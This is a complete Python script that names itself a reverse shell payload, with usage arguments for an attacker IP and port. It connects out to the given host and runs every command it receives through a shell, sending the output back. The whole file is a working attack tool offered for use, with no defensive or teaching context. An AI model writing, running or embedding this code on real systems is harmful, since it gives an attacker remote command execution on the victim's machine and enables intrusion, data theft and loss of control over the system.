#!/usr/bin/env python3
"""
Simple Python reverse shell payload
Usage: python reverse_shell.py ATTACKER_IP PORT
"""
import socket
import subprocess
import sys
import os

def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(f"[+] Connection from {os.getcwd()}\n".encode())
        
        while True:
            data = s.recv(1024).decode('utf-8')
            if not data or data.strip() == 'exit':
                break
            
            if data.strip():
                try:
                    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error: {str(e)}\n".encode())
        
        s.close()
    except Exception as e:
        print(f"Connection failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    reverse_shell(host, port)
